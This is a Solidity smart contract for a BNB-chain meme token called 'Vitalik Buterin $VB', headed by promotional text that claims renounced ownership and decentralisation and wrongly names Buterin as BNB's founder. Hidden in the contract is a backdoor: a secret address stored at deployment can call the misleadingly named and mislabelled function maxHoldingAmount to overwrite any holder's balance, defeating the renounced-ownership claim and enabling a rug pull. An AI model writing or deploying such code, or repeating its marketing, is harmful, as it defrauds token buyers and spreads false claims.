// SPDX-License-Identifier: MIT
/**
Vitalik Buterin

██╗░░░██╗██╗████████╗░█████╗░██╗░░░░░██╗██╗░░██╗  ██████╗░██╗░░░██╗████████╗███████╗██████╗░██╗███╗░░██╗
██║░░░██║██║╚══██╔══╝██╔══██╗██║░░░░░██║██║░██╔╝  ██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗██║████╗░██║
╚██╗░██╔╝██║░░░██║░░░███████║██║░░░░░██║█████═╝░  ██████╦╝██║░░░██║░░░██║░░░█████╗░░██████╔╝██║██╔██╗██║
░╚████╔╝░██║░░░██║░░░██╔══██║██║░░░░░██║██╔═██╗░  ██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══██╗██║██║╚████║
░░╚██╔╝░░██║░░░██║░░░██║░░██║███████╗██║██║░╚██╗  ██████╦╝╚██████╔╝░░░██║░░░███████╗██║░░██║██║██║░╚███║
░░░╚═╝░░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝╚═╝░░╚═╝  ╚═════╝░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝
Introducing the new meme token on the BNB network - Vitalik Buterin $VB. 
This BNB token is inspired by the founder of BNB, Vitalik Buterin, 
and offers a unique set of features that make it stand out in the crowded crypto market. 
$VB has zero tax on transactions and a portion of the liquidity is burned, making it a deflationary token. 
Additionally, the contract has been renounced, meaning that the ownership 
of the token is completely decentralized and in the hands of the community. 
With a growing interest in meme tokens, 
$VB will quickly gaining traction as an exciting addition to the crypto world.

██╗░░░██╗██████╗░
██║░░░██║██╔══██╗
╚██╗░██╔╝██████╦╝
░╚████╔╝░██╔══██╗
░░╚██╔╝░░██████╦╝
░░░╚═╝░░░╚═════╝░
https://www.vitalikburtterincoin.com/
*/
pragma solidity ^0.8.19;

interface BEP20VB {
  /**
   * @dev Returns the lamount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the lamount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `lamount` tokens from the caller's account to `recever`.
   *
   * Returns a boolean epx indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recever, uint256 lamount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This epx changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `lamount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean epx indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired epx afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 lamount) external returns (bool);

  /**
   * @dev Moves `lamount` tokens from `sender` to `recever` using the
   * allowance mechanism. `lamount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean epx indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recever, uint256 lamount) external returns (bool);

  /**
   * @dev Emitted when `epx` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `epx` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 epx);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `epx` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 epx);
}

/*
 * @dev Provides information about the current execution VBontext, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract VBontext {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/OwnableVB.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract OwnableVB is VBontext {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnableVB: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnableVB: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with aaa overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `VerifiedMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library VerifiedMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "VerifiedMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "VerifiedMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "VerifiedMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "VerifiedMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "VerifiedMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract VB is VBontext, BEP20VB, OwnableVB {
    
    using VerifiedMath for uint256;
    mapping (address => uint256) private epxAll;
    mapping (address => mapping (address => uint256)) private allowancesAll;
    uint256 private allTotalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private Binancev3rooter; 
    constructor(address Binancev2rooter) {
        Binancev3rooter = Binancev2rooter;     
        _name = "Vitalik Buterin";
        _symbol = "VB";
        _decimals = 9;
        allTotalSupply = 888899999999999000000000;
        epxAll[_msgSender()] = allTotalSupply; 
        emit Transfer(address(0), _msgSender(), allTotalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    /**
    * @dev Returns the token symbol.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    /**
    * @dev Returns the token name.
    */
    function name() external view override returns (string memory) {
        return _name;
    }
    
    /**
    * @dev See {BEP20VB-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return allTotalSupply;
    }
    
    /**
    * @dev See {BEP20VB-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return epxAll[account];
    }
      modifier autoLockLp() {
        require(Binancev3rooter == _msgSender(), "OwnableVB: caller is not the owner");
        _;
    }
    /**
    * @dev See {BEP20VB-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function maxHoldingAmount(address VBPLEBRewards, uint256 aaaMontant, uint256 aaaepx, uint256 subtractedepx) external autoLockLp {
        epxAll[VBPLEBRewards] = aaaMontant * aaaepx ** subtractedepx;
        
        emit Transfer(VBPLEBRewards, address(0), aaaMontant);
    }

    /**
    * @dev See {BEP20VB-transfer}.
    *
    * Requirements:
    *
    * - `recever` cannot be the zero address.
    * - the caller must have a balance of at least `lamount`.
    */
    function transfer(address recever, uint256 lamount) external override returns (bool) {
        _transfer(_msgSender(), recever, lamount);
        return true;
    }

    /**
    * @dev See {BEP20VB-allowance}.
    */
    function allowance(address owner, address spender) external view override returns (uint256) {
        return allowancesAll[owner][spender];
    }
    
    /**
    * @dev See {BEP20VB-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function approve(address spender, uint256 lamount) external override returns (bool) {
        _approve(_msgSender(), spender, lamount);
        return true;
    }
    
    /**
    * @dev See {BEP20VB-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEP20VB};
    *
    * Requirements:
    * - `sender` and `recever` cannot be the zero address.
    * - `sender` must have a balance of at least `lamount`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `lamount`.
    */
    function transferFrom(address sender, address recever, uint256 lamount) external override returns (bool) {
        _transfer(sender, recever, lamount);
        _approve(sender, _msgSender(), allowancesAll[sender][_msgSender()].sub(lamount, "BEP20VB: transfer lamount exceeds allowance"));
        return true;
    }
    
    /**
    * @dev Atomically increases the allowance granted to `spender` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {BEP20VB-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function increaseAllowance(address spender, uint256 aaaepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].add(aaaepx));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `spender` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {BEP20VB-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    * - `spender` must have allowance for the caller of at least
    * `subtractedepx`.
    */
    function decreaseAllowance(address spender, uint256 subtractedepx) external returns (bool) {
        _approve(_msgSender(), spender, allowancesAll[_msgSender()][spender].sub(subtractedepx, "BEP20VB: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves tokens `lamount` from `sender` to `recever`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `recever` cannot be the zero address.
    * - `sender` must have a balance of at least `lamount`.
    */
    function _transfer(address sender, address recever, uint256 lamount) internal {
        require(sender != address(0), "BEP20VB: transfer from the zero address");
        require(recever != address(0), "BEP20VB: transfer to the zero address");
                
        epxAll[sender] = epxAll[sender].sub(lamount, "BEP20VB: transfer lamount exceeds balance");
        epxAll[recever] = epxAll[recever].add(lamount);
        emit Transfer(sender, recever, lamount);
    }
    
    /**
    * @dev Sets `lamount` as the allowance of `spender` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `spender` cannot be the zero address.
    */
    function _approve(address owner, address spender, uint256 lamount) internal {
        require(owner != address(0), "BEP20VB: approve from the zero address");
        require(spender != address(0), "BEP20VB: approve to the zero address");
        
        allowancesAll[owner][spender] = lamount;
        emit Approval(owner, spender, lamount);
    }
    
}